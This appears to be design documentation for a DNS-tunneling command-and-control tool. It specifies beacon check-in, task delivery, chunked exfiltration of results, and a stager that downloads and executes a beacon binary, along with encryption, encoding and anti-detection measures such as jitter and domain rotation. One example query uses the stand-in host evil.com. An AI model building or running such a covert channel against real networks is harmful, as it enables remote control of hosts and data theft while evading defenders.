# DNS Message Formats

## Complete Protocol Reference

### Beacon → DNS Server Messages

| Message Type | Format | Description | Example |
|--------------|--------|-------------|---------|
| **CHECKIN/CHK** | `CHK\|beaconID\|hostname\|username\|os\|arch` | Beacon check-in to register and poll for tasks | `CHK\|abc123\|WORKSTATION1\|jsmith\|windows\|amd64` |
| **RESULT** | `RESULT\|beaconID\|taskID\|<result_data>` | Submit complete task result (small results) | `RESULT\|abc123\|task001\|Command output here` |
| **RESULT_META** | `RESULT_META\|beaconID\|taskID\|totalSize\|totalChunks` | Announce incoming chunked result (phase 1) | `RESULT_META\|abc123\|task001\|524288\|10` |
| **DATA** | `DATA\|beaconID\|taskID\|chunkIndex\|<chunk_data>` | Submit result chunk (phase 2) | `DATA\|abc123\|task001\|0\|<base64_chunk>` |

### Stager → DNS Server Messages

| Message Type | Format | Description | Example |
|--------------|--------|-------------|---------|
| **STG** | `STG\|clientIP\|os\|arch` | Initial stager request to start session | `STG\|192.168.1.100\|windows\|amd64` |
| **CHUNK** | `CHUNK\|chunkIndex\|clientIP\|sessionID` | Request specific beacon chunk | `CHUNK\|0\|192.168.1.100\|sess_abc123` |
| **ACK** | `ACK\|chunkIndex\|clientIP\|sessionID` | (DEPRECATED) Old stager acknowledgment | `ACK\|5\|192.168.1.100\|sess_abc123` |

### DNS Server → Beacon/Stager Responses

| Response Type | Format | Description | Example |
|---------------|--------|-------------|---------|
| **Task Delivery** | `TASK\|taskID\|command` | Deliver task to beacon | `TASK\|task001\|whoami` |
| **ACK** | `ACK` | Acknowledge message receipt | `ACK` |
| **Chunk Data** | `<base36_encoded_chunk>` | Binary chunk for stager | `3g7k2m...` |
| **Session Info** | `sessionID\|totalChunks` | Response to STG request | `sess_abc123\|15` |
| **ERROR** | `ERROR` | Invalid or malformed message | `ERROR` |

## DNS Wire Format

### Query Format (Beacon/Stager → DNS Server)

```
┌─────────────────────────────────────────────────────────┐
│                     DNS Query Name                      │
├─────────────────────────────────────────────────────────┤
│  <base36_encoded_message>.<base36_encoded_message>.     │
│  <base36_encoded_message>.example.com                   │
│                                                         │
│  Max label length: 63 characters                        │
│  Max query length: 255 characters                       │
│  Encoding: Base36 (DNS-safe)                            │
│  Encryption: AES-256-GCM                                │
└─────────────────────────────────────────────────────────┘

Query Type:    TXT (Type 16)
Query Class:   IN (Class 1)
```

### Response Format (DNS Server → Beacon/Stager)

```
┌─────────────────────────────────────────────────────────┐
│                    DNS TXT Record                       │
├─────────────────────────────────────────────────────────┤
│  TXT: "<base36_encoded_response>"                       │
│                                                         │
│  Max TXT length: 255 characters per string              │
│  Multiple strings supported (up to 16KB total)          │
│  Encoding: Base36 (DNS-safe)                            │
│  Encryption: AES-256-GCM                                │
└─────────────────────────────────────────────────────────┘

Response Type:  TXT (Type 16)
Response Class: IN (Class 1)
TTL:            0 (no caching)
```

## Encryption & Encoding Pipeline

### Outbound (Plaintext → DNS Query)

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  Plaintext   │───>│  AES-256-GCM │───>│Base36 Encode │───>│ DNS Labels   │
│   Message    │    │  Encryption  │    │  (DNS-safe)  │    │ (62 char max)│
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
     |                     |                    |                    |
  "CHK|abc"          [encrypted bytes]     "3g7k2m..."      "3g7k2m.abc.com"
```

### Inbound (DNS Response → Plaintext)

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  DNS TXT     │───>│Base36 Decode │───>│  AES-256-GCM │───>│  Plaintext   │
│   Record     │    │              │    │  Decryption  │    │   Response   │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
     |                     |                    |                    |
 "TXT: 3g7k..."        [encoded bytes]    [encrypted bytes]      "ACK"
```

## Message Flow Examples

### Example 1: Beacon Check-in

```
Client:
  Plaintext:  "CHK|abc123|WIN-PC|admin|windows|amd64|1699999999"
  Encrypted:  [binary AES-GCM output]
  Encoded:    "h8d2k...j9s3m"
  DNS Query:  "h8d2k.9f3ls.j9s3m.evil.com TXT?"
  
Server:
  DNS Response: TXT "2m8sk...3k9d2"
  Decoded:      [binary data]
  Decrypted:    "TASK|task001|whoami"
  
Beacon receives task: "whoami"
```

### Example 2: Large Result (Two-Phase Protocol)

```
Phase 1 - Metadata Announcement:
  Client → Server:  "RESULT_META|abc123|task001|1048576|20"
  Server → Client:  "ACK"

Phase 2 - Chunked Upload:
  Client → Server:  "DATA|abc123|task001|0|<chunk_0>"
  Server → Client:  "ACK"
  
  Client → Server:  "DATA|abc123|task001|1|<chunk_1>"
  Server → Client:  "ACK"
  
  ... (18 more chunks)
  
  Client → Server:  "DATA|abc123|task001|19|<chunk_19>"
  Server → Client:  "ACK"
  
Server assembles all 20 chunks into complete result
```

### Example 3: Stager Download

```
Phase 1 - Session Creation:
  Stager → Server:  "STG|192.168.1.100|windows|amd64"
  Server → Stager:  "sess_abc123|15"  (session ID, 15 chunks total)

Phase 2 - Chunk Requests:
  Stager → Server:  "CHUNK|0|192.168.1.100|sess_abc123"
  Server → Stager:  "<base36_beacon_chunk_0>"
  
  Stager → Server:  "CHUNK|1|192.168.1.100|sess_abc123"
  Server → Stager:  "<base36_beacon_chunk_1>"
  
  ... (13 more chunks)
  
  Stager → Server:  "CHUNK|14|192.168.1.100|sess_abc123"
  Server → Stager:  "<base36_beacon_chunk_14>"
  
Stager reassembles beacon binary and executes
```

## Protocol States

### Beacon Lifecycle States

```
1. [Initial]     - Not yet registered
2. [Check-in]    - CHK message sent → beacon registered
3. [Active]      - Polling for tasks (CHK every 60-120s)
4. [Tasked]      - Task received, executing
5. [Reporting]   - Submitting results (RESULT or DATA chunks)
6. [Idle]        - No pending tasks, continues polling
```

### Stager Lifecycle States

```
1. [Initial]     - Stager executed on target
2. [Request]     - STG message → session created
3. [Downloading] - CHUNK requests → receiving beacon chunks
4. [Complete]    - All chunks received
5. [Execute]     - Beacon binary assembled and launched
```

## Error Handling

### Error Responses

| Error Type | Response | Meaning |
|------------|----------|---------|
| **Malformed Message** | `ERROR` | Invalid format or missing fields |
| **Unknown Beacon** | `ACK` | Beacon not registered (implicit retry) |
| **Unknown Session** | `ERROR` | Stager session not found |
| **Invalid Chunk** | `ACK` | Chunk index out of range (retry) |
| **Timeout** | (no response) | Query timed out, client retries |

### Client Retry Logic

- **Retry Attempts**: 3 attempts per query
- **Backoff Strategy**: 1s, 4s, 9s (exponential)
- **Domain Failover**: Shadow Mesh rotation on failure
- **Session Timeout**: 30 minutes for stagers, 5 minutes for expected results

## DNS Packet Structure

### Standard DNS Header (12 bytes)

| Field | Size | Description |
|-------|------|-------------|
| ID | 2 bytes | Transaction ID |
| Flags | 2 bytes | QR, Opcode, AA, TC, RD, RA, Z, RCODE |
| QDCount | 2 bytes | Number of questions |
| ANCount | 2 bytes | Number of answers |
| NSCount | 2 bytes | Number of authority records |
| ARCount | 2 bytes | Number of additional records |

### DNS Question Section

| Field | Size | Description |
|-------|------|-------------|
| Name | Variable | Domain name (labels with length prefixes) |
| Type | 2 bytes | Query type (16 = TXT) |
| Class | 2 bytes | Query class (1 = IN) |

### DNS Answer Section (TXT Record)

| Field | Size | Description |
|-------|------|-------------|
| Name | Variable | Domain name or pointer |
| Type | 2 bytes | Record type (16 = TXT) |
| Class | 2 bytes | Record class (1 = IN) |
| TTL | 4 bytes | Time to live (0 = no cache) |
| RDLength | 2 bytes | Length of RData |
| RData | Variable | TXT strings (length-prefixed) |

## Implementation Notes

### Client-Side (Beacon/Stager)

- **Library**: Go `net` package standard resolver
- **Query Type**: TXT records only
- **Timeout**: Configurable (default 10s)
- **Retries**: 3 attempts with exponential backoff
- **Domain Selection**: Random or round-robin from config

### Server-Side (DNS Server)

- **Protocol**: UDP port 53 (primary), TCP port 53 (fallback)
- **Parser**: Custom DNS wire format parser
- **Cache**: Local SQLite for task/result queuing
- **Master Sync**: HTTPS API every 30s
- **Rate Limiting**: 1000 queries/min per beacon

## Security Features

### Encryption Details

- **Algorithm**: AES-256-GCM
- **Key Derivation**: SHA-256 of shared secret
- **Nonce**: 12 bytes random per message
- **Authentication**: GCM tag provides integrity

### Anti-Detection Features

- **Timestamp Injection**: Bypasses DNS cache
- **Domain Rotation**: Shadow Mesh prevents patterns
- **Jitter**: Randomized check-in intervals (60-120s)
- **Chunking**: Large data split to avoid size anomalies
- **Rate Limiting**: Throttled exfil prevents volume spikes
